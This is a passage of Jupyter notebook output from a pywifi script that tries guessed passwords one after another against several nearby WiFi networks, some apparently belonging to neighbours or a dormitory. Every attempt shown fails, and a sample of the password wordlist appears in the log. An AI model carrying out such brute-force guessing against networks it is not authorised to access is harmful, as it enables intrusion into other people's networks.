     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 49 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 000440Zod\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:14:08,545 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 49 Fail Current WifiName: whhh Current Password: 000440Zod\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:14:13,573 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 49 Fail Current WifiName: Ruoshui317 Current Password: 000440Zod\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:14:19,144 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 49 Fail Current WifiName: 311 Current Password: 000440Zod\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:14:24,717 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 49 Fail Current WifiName: 321sushe Current Password: 000440Zod\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:14:30,292 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 49 Fail Current WifiName: 313 Current Password: 000440Zod\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:14:35,868 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 50 Fail Current WifiName: BP2197 Current Password: VHG99063\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:14:41,450 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 50 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: VHG99063\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:14:47,021 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 50 Fail Current WifiName: whhh Current Password: VHG99063\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:14:52,042 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 50 Fail Current WifiName: Ruoshui317 Current Password: VHG99063\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:14:57,610 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 50 Fail Current WifiName: 311 Current Password: VHG99063\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:15:03,181 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 50 Fail Current WifiName: 321sushe Current Password: VHG99063\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:15:08,771 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 50 Fail Current WifiName: 313 Current Password: VHG99063\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:15:14,342 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 51 Fail Current WifiName: BP2197 Current Password: 048705UT\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:15:19,918 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 51 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 048705UT\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:15:25,494 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 51 Fail Current WifiName: whhh Current Password: 048705UT\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:15:30,515 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 51 Fail Current WifiName: Ruoshui317 Current Password: 048705UT\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:15:36,102 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 51 Fail Current WifiName: 311 Current Password: 048705UT\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:15:41,690 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 51 Fail Current WifiName: 321sushe Current Password: 048705UT\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:15:47,267 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 51 Fail Current WifiName: 313 Current Password: 048705UT\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:15:52,833 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 52 Fail Current WifiName: BP2197 Current Password: dg7970836\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:15:58,404 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 52 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: dg7970836\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:16:03,978 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 52 Fail Current WifiName: whhh Current Password: dg7970836\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:16:08,997 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 52 Fail Current WifiName: Ruoshui317 Current Password: dg7970836\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:16:14,569 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 52 Fail Current WifiName: 311 Current Password: dg7970836\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:16:20,147 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 52 Fail Current WifiName: 321sushe Current Password: dg7970836\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:16:25,722 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 52 Fail Current WifiName: 313 Current Password: dg7970836\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:16:31,299 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 53 Fail Current WifiName: BP2197 Current Password: 0145840yq\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:16:36,875 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 53 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 0145840yq\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:16:42,449 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 53 Fail Current WifiName: whhh Current Password: 0145840yq\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:16:47,470 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 53 Fail Current WifiName: Ruoshui317 Current Password: 0145840yq\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:16:53,035 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 53 Fail Current WifiName: 311 Current Password: 0145840yq\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:16:58,601 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 53 Fail Current WifiName: 321sushe Current Password: 0145840yq\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:17:04,169 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 53 Fail Current WifiName: 313 Current Password: 0145840yq\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:17:09,736 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 54 Fail Current WifiName: BP2197 Current Password: gH6831203\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:17:15,311 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 54 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: gH6831203\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:17:20,884 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 54 Fail Current WifiName: whhh Current Password: gH6831203\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:17:25,902 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 54 Fail Current WifiName: Ruoshui317 Current Password: gH6831203\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:17:31,485 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 54 Fail Current WifiName: 311 Current Password: gH6831203\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:17:37,057 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 54 Fail Current WifiName: 321sushe Current Password: gH6831203\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:17:42,630 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 54 Fail Current WifiName: 313 Current Password: gH6831203\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:17:48,204 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 55 Fail Current WifiName: BP2197 Current Password: 384771jO\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:17:53,776 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 55 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 384771jO\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:17:59,361 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 55 Fail Current WifiName: whhh Current Password: 384771jO\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:18:04,382 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 55 Fail Current WifiName: Ruoshui317 Current Password: 384771jO\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:18:09,964 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 55 Fail Current WifiName: 311 Current Password: 384771jO\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:18:15,541 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 55 Fail Current WifiName: 321sushe Current Password: 384771jO\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:18:21,118 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 55 Fail Current WifiName: 313 Current Password: 384771jO\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:18:26,698 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 56 Fail Current WifiName: BP2197 Current Password: gIb81160467\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:18:32,273 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 56 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: gIb81160467\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:18:37,853 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 56 Fail Current WifiName: whhh Current Password: gIb81160467\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:18:42,874 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 56 Fail Current WifiName: Ruoshui317 Current Password: gIb81160467\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:18:48,451 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 56 Fail Current WifiName: 311 Current Password: gIb81160467\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:18:54,018 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 56 Fail Current WifiName: 321sushe Current Password: gIb81160467\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:18:59,593 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 56 Fail Current WifiName: 313 Current Password: gIb81160467\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:19:05,173 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 58 Fail Current WifiName: BP2197 Current Password: dnv82826604\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:19:10,748 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 58 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: dnv82826604\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:19:16,324 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 58 Fail Current WifiName: whhh Current Password: dnv82826604\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:19:21,344 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 58 Fail Current WifiName: Ruoshui317 Current Password: dnv82826604\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:19:26,921 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 58 Fail Current WifiName: 311 Current Password: dnv82826604\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:19:32,487 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 58 Fail Current WifiName: 321sushe Current Password: dnv82826604\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:19:38,069 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 58 Fail Current WifiName: 313 Current Password: dnv82826604\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:19:43,635 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 59 Fail Current WifiName: BP2197 Current Password: 1771591iJ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:19:49,206 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 59 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 1771591iJ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:19:54,780 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 59 Fail Current WifiName: whhh Current Password: 1771591iJ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:19:59,800 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 59 Fail Current WifiName: Ruoshui317 Current Password: 1771591iJ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:20:05,368 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 59 Fail Current WifiName: 311 Current Password: 1771591iJ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:20:10,942 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 59 Fail Current WifiName: 321sushe Current Password: 1771591iJ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:20:16,514 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 59 Fail Current WifiName: 313 Current Password: 1771591iJ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:20:22,090 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 61 Fail Current WifiName: BP2197 Current Password: 942644va\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:20:27,655 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 61 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 942644va\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:20:33,227 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 61 Fail Current WifiName: whhh Current Password: 942644va\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:20:38,256 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 61 Fail Current WifiName: Ruoshui317 Current Password: 942644va\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:20:43,832 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 61 Fail Current WifiName: 311 Current Password: 942644va\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:20:49,406 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 61 Fail Current WifiName: 321sushe Current Password: 942644va\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:20:54,987 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 61 Fail Current WifiName: 313 Current Password: 942644va\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:21:00,553 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 62 Fail Current WifiName: BP2197 Current Password: Pf733869\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:21:06,135 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 62 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: Pf733869\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:21:11,709 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 62 Fail Current WifiName: whhh Current Password: Pf733869\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:21:16,729 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 62 Fail Current WifiName: Ruoshui317 Current Password: Pf733869\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:21:22,301 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 62 Fail Current WifiName: 311 Current Password: Pf733869\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:21:27,869 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 62 Fail Current WifiName: 321sushe Current Password: Pf733869\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:21:33,442 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 62 Fail Current WifiName: 313 Current Password: Pf733869\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:21:39,017 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 63 Fail Current WifiName: BP2197 Current Password: 8334020QX\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:21:44,589 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 63 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 8334020QX\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:21:50,164 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 63 Fail Current WifiName: whhh Current Password: 8334020QX\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:21:55,187 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 63 Fail Current WifiName: Ruoshui317 Current Password: 8334020QX\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:22:00,761 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 63 Fail Current WifiName: 311 Current Password: 8334020QX\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:22:06,334 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 63 Fail Current WifiName: 321sushe Current Password: 8334020QX\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:22:11,921 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 63 Fail Current WifiName: 313 Current Password: 8334020QX\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:22:17,505 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 64 Fail Current WifiName: BP2197 Current Password: RbF42884043\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:22:23,083 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 64 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: RbF42884043\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:22:28,648 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 64 Fail Current WifiName: whhh Current Password: RbF42884043\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:22:33,667 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 64 Fail Current WifiName: Ruoshui317 Current Password: RbF42884043\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:22:39,255 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 64 Fail Current WifiName: 311 Current Password: RbF42884043\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:22:44,826 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 64 Fail Current WifiName: 321sushe Current Password: RbF42884043\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:22:50,398 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 64 Fail Current WifiName: 313 Current Password: RbF42884043\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:24:39,754 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 66 Fail Current WifiName: Ruoshui317 Current Password: zb772248\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:24:45,320 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 66 Fail Current WifiName: 311 Current Password: zb772248\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:24:50,886 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 66 Fail Current WifiName: 321sushe Current Password: zb772248\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:24:56,455 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 66 Fail Current WifiName: 313 Current Password: zb772248\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:25:02,022 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
